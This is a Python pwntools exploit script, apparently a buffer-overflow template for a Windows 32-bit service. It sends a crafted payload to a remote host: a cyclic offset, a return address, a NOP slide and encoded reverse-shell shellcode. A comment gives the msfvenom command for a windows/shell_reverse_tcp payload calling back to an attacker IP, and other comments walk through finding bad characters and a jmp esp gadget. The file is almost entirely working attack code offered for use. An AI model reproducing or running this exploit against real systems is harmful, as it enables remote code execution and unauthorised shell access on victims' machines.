#!/usr/bin/env python

from pwn import *

context(arch = 'i386', os = 'windows')

r = remote("some_host", 31337)

######################### find offset #########################
#r.sendline(cyclic(5000))
#print(cyclic_find('crash-addr'))
######################### find offset #########################

offset = 0x616d6261
retn = p32(0x080414c3)
payload = cyclic(cyclic_find(offset))
payload += retn

######################### find bad chars #########################
# generate bytearray in mona: !mona bytearray -b "\x00"
all_chars = [p8(i) for i in range(0, 256)]
# !mona compare -f C:\path\to\bytearray.bin -a <ESP>
badchars = [p8(0), p8(0x0a)]
filtered_chars = [bd for bd in all_chars if bd not in badchars]
#payload += flat(filtered_chars)
######################### find bad chars #########################

######################### find jmp point #########################
# !mona jmp -r esp -cpb "\x00\xlistofbadchars"
# set retn
######################### find jmp point #########################

######################### shellcode ########################
# msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=5555 -b "\x00\xbadchars" -f rb
# format to python with vim: :'<,'>s/+ "/+ b"/g
nop_slide = p8(0x90) * 20
#shellcode = b"\xda\xdf\xbb\xb5\x1a\xed\x98\xd9\x74\x24\xf4\x5a\x29\xc9" + b"\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\xef\x09\x0f\x6d\xf3" + b"\xc6\x4d\x8e\x0b\x17\x32\x06\xee\x26\x72\x7c\x7b\x18\x42" + b"\xf6\x29\x95\x29\x5a\xd9\x2e\x5f\x73\xee\x87\xea\xa5\xc1" + b"\x18\x46\x95\x40\x9b\x95\xca\xa2\xa2\x55\x1f\xa3\xe3\x88" + b"\xd2\xf1\xbc\xc7\x41\xe5\xc9\x92\x59\x8e\x82\x33\xda\x73" + b"\x52\x35\xcb\x22\xe8\x6c\xcb\xc5\x3d\x05\x42\xdd\x22\x20" + b"\x1c\x56\x90\xde\x9f\xbe\xe8\x1f\x33\xff\xc4\xed\x4d\x38" + b"\xe2\x0d\x38\x30\x10\xb3\x3b\x87\x6a\x6f\xc9\x13\xcc\xe4" + b"\x69\xff\xec\x29\xef\x74\xe2\x86\x7b\xd2\xe7\x19\xaf\x69" + b"\x13\x91\x4e\xbd\x95\xe1\x74\x19\xfd\xb2\x15\x38\x5b\x14" + b"\x29\x5a\x04\xc9\x8f\x11\xa9\x1e\xa2\x78\xa6\xd3\x8f\x82" + b"\x36\x7c\x87\xf1\x04\x23\x33\x9d\x24\xac\x9d\x5a\x4a\x87" + b"\x5a\xf4\xb5\x28\x9b\xdd\x71\x7c\xcb\x75\x53\xfd\x80\x85" + b"\x5c\x28\x06\xd5\xf2\x83\xe7\x85\xb2\x73\x80\xcf\x3c\xab" + b"\xb0\xf0\x96\xc4\x5b\x0b\x71\x2b\x33\x2b\x80\xc3\x46\x4b" + b"\x97\xa0\xce\xad\xfd\xd6\x86\x66\x6a\x4e\x83\xfc\x0b\x8f" + b"\x19\x79\x0b\x1b\xae\x7e\xc2\xec\xdb\x6c\xb3\x1c\x96\xce" + b"\x12\x22\x0c\x66\xf8\xb1\xcb\x76\x77\xaa\x43\x21\xd0\x1c" + b"\x9a\xa7\xcc\x07\x34\xd5\x0c\xd1\x7f\x5d\xcb\x22\x81\x5c" + b"\x9e\x1f\xa5\x4e\x66\x9f\xe1\x3a\x36\xf6\xbf\x94\xf0\xa0" + b"\x71\x4e\xab\x1f\xd8\x06\x2a\x6c\xdb\x50\x33\xb9\xad\xbc" + b"\x82\x14\xe8\xc3\x2b\xf1\xfc\xbc\x51\x61\x02\x17\xd2\x91" + b"\x49\x35\x73\x3a\x14\xac\xc1\x27\xa7\x1b\x05\x5e\x24\xa9" + b"\xf6\xa5\x34\xd8\xf3\xe2\xf2\x31\x8e\x7b\x97\x35\x3d\x7b" + b"\xb2"
shellcode = b"\xbf\xaa\x9b\x86\x90\xdb\xca\xd9\x74\x24\xf4\x58\x2b\xc9" + b"\xb1\x52\x83\xc0\x04\x31\x78\x0e\x03\xd2\x95\x64\x65\xde" + b"\x42\xea\x86\x1e\x93\x8b\x0f\xfb\xa2\x8b\x74\x88\x95\x3b" + b"\xfe\xdc\x19\xb7\x52\xf4\xaa\xb5\x7a\xfb\x1b\x73\x5d\x32" + b"\x9b\x28\x9d\x55\x1f\x33\xf2\xb5\x1e\xfc\x07\xb4\x67\xe1" + b"\xea\xe4\x30\x6d\x58\x18\x34\x3b\x61\x93\x06\xad\xe1\x40" + b"\xde\xcc\xc0\xd7\x54\x97\xc2\xd6\xb9\xa3\x4a\xc0\xde\x8e" + b"\x05\x7b\x14\x64\x94\xad\x64\x85\x3b\x90\x48\x74\x45\xd5" + b"\x6f\x67\x30\x2f\x8c\x1a\x43\xf4\xee\xc0\xc6\xee\x49\x82" + b"\x71\xca\x68\x47\xe7\x99\x67\x2c\x63\xc5\x6b\xb3\xa0\x7e" + b"\x97\x38\x47\x50\x11\x7a\x6c\x74\x79\xd8\x0d\x2d\x27\x8f" + b"\x32\x2d\x88\x70\x97\x26\x25\x64\xaa\x65\x22\x49\x87\x95" + b"\xb2\xc5\x90\xe6\x80\x4a\x0b\x60\xa9\x03\x95\x77\xce\x39" + b"\x61\xe7\x31\xc2\x92\x2e\xf6\x96\xc2\x58\xdf\x96\x88\x98" + b"\xe0\x42\x1e\xc8\x4e\x3d\xdf\xb8\x2e\xed\xb7\xd2\xa0\xd2" + b"\xa8\xdd\x6a\x7b\x42\x24\xfd\x8e\x9a\xa3\x52\xe6\x9e\xab" + b"\xb9\x44\x17\x4d\xab\xba\x7e\xc6\x44\x22\xdb\x9c\xf5\xab" + b"\xf1\xd9\x36\x27\xf6\x1e\xf8\xc0\x73\x0c\x6d\x21\xce\x6e" + b"\x38\x3e\xe4\x06\xa6\xad\x63\xd6\xa1\xcd\x3b\x81\xe6\x20" + b"\x32\x47\x1b\x1a\xec\x75\xe6\xfa\xd7\x3d\x3d\x3f\xd9\xbc" + b"\xb0\x7b\xfd\xae\x0c\x83\xb9\x9a\xc0\xd2\x17\x74\xa7\x8c" + b"\xd9\x2e\x71\x62\xb0\xa6\x04\x48\x03\xb0\x08\x85\xf5\x5c" + b"\xb8\x70\x40\x63\x75\x15\x44\x1c\x6b\x85\xab\xf7\x2f\xb5" + b"\xe1\x55\x19\x5e\xac\x0c\x1b\x03\x4f\xfb\x58\x3a\xcc\x09" + b"\x21\xb9\xcc\x78\x24\x85\x4a\x91\x54\x96\x3e\x95\xcb\x97" + b"\x6a"
######################### shellcode ########################

payload += nop_slide
payload += shellcode

print(payload)
r.sendline(payload)
